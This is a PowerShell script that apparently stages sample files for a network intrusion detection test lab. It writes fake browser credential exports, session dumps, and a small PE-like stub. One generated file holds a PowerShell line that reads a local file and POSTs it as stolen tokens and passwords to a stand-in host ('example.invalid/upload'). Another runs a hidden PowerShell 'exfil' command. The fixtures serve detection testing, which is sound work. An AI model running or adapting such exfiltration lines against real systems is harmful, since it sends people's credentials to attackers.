[CmdletBinding()]
param(
    [string]$WorkspaceRoot = "C:\NIDS_Workspace",
    [string]$TargetDir = ""
)

$ErrorActionPreference = "Stop"

$workspaceRootResolved = [System.IO.Path]::GetFullPath($WorkspaceRoot)
$incomingRoot = Join-Path $workspaceRootResolved "NIDS_TestLab\artifacts\incoming"
$runToken = "credential-stealer-static-$(Get-Date -Format yyyyMMdd-HHmmss)"
$targetDirResolved = if ($TargetDir.Trim() -ne "") {
    [System.IO.Path]::GetFullPath($TargetDir)
} else {
    Join-Path $incomingRoot $runToken
}

New-Item -ItemType Directory -Force -Path $targetDirResolved | Out-Null

@'
{
  "profiles": [
    {
      "site": "mail.example",
      "username": "alice@example.com",
      "password": "Spring2026!",
      "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.sample.payload",
      "api_key": "ABCDEF0123456789"
    }
  ]
}
'@ | Set-Content -LiteralPath (Join-Path $targetDirResolved "01_browser_export.json") -Encoding ASCII

@'
token=slack-session-123456
password=Backup!2026
private key -----BEGIN PRIVATE KEY----- SAMPLE -----END PRIVATE KEY-----
'@ | Set-Content -LiteralPath (Join-Path $targetDirResolved "02_session_dump.txt") -Encoding ASCII

@'
$loot = Get-Content "$env:TEMP\browser.txt"
powershell -NoProfile
Invoke-WebRequest -Uri "https://example.invalid/upload" -Method Post -Body "token=$loot&password=stolen"
'@ | Set-Content -LiteralPath (Join-Path $targetDirResolved "03_browser_sync.ps1") -Encoding ASCII

@'
import os

payload = "token=discord-12345&password=Summer2026!"
os.system("powershell -nop -c echo exfil")
print(payload)
'@ | Set-Content -LiteralPath (Join-Path $targetDirResolved "04_cookie_sync.py") -Encoding ASCII

@'
MZ
Safe credential-harvest fixture only.
password=
token=
api_key
http://example.invalid/exfil
ws2_32.dll
'@ | Set-Content -LiteralPath (Join-Path $targetDirResolved "05_webcache_export.bin") -Encoding ASCII

@'
Remote Work Password Rotation Policy

Do not share account passwords with anyone.
'@ | Set-Content -LiteralPath (Join-Path $targetDirResolved "06_password_policy.txt") -Encoding ASCII

Write-Output "Staged: $targetDirResolved"
